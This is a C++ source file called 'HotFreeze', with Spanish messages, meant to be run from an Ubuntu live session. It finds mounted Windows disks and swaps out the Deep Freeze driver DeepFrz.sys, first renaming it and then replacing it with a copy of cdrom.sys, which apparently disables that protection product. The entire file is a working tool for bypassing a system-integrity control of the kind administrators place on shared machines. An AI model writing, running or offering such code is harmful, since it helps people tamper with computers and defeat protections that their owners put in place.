#include <iostream>
#include <list>
#include <string>
#include <dirent.h>
#include <filesystem>
#include <stdio.h>
#include <cstdio>

using namespace std;
namespace fs = std::filesystem;

int main(int argc, char *argv[])
{
    cout << "HotFreeze for @rocopolas" << "\n";
    std::list<std::string> discos;
    string path;
    string path_viejo;
    string path_nuevo;
    std::string ruta = "/media/ubuntu/";
    string win = "/Windows";

	DIR* folder = opendir(ruta.c_str());
     if (folder == nullptr) {
        std::cerr << "Error al abrir " << ruta << std::endl;
        return 1;
    }
    dirent* entry;
    while ((entry = readdir(folder)) != nullptr) {
        discos.push_back(entry->d_name);
    }
    closedir(folder);

    for (auto it = discos.begin(); it != discos.end(); ++it) {
    	path = ruta + *it + win;
        if (fs::exists(path)) {
            std::cout << "El disco " << *it << " tiene Windows instalado." << std::endl;

            path = path + "/System32";
            path_viejo = path+"/DeepFrz.sys";
            path_nuevo = path+"/Hotfreeze.sys";

    		int result = rename(path_viejo.c_str(), path_nuevo.c_str()); 
    		if(result == 0) {
		        cout << "Cambio de nombre correctamente" << std::endl;
		    } else {
		        cout << "Error de cambio de nombre" << std::endl;
		    }

            path_viejo = path+"/drivers/cdrom.sys";
            path_nuevo = path+"/DeepFrz.sys";

            FILE* archivo_original = fopen(path_viejo.c_str(),"r");
            FILE* archivo_copia = fopen(path_nuevo.c_str(),"w");

			if(archivo_original == NULL) {
			        cout << "No se pudo abrir cdrom.sys" << std::endl;
			        return 1;
			    }

			if(archivo_copia == NULL) {
			    cout << "No se pudo crear el nuevo DeepFrz.sys." << std::endl;
			    return 1;
			}

			char buffer[4096];
		    size_t read_size = 0;

		    while((read_size = fread(buffer, 1, sizeof(buffer), archivo_original)) > 0) {
		        fwrite(buffer, 1, read_size, archivo_copia);
		    }

		    fclose(archivo_original);
		    fclose(archivo_copia);
        }
    }
    return 0;
}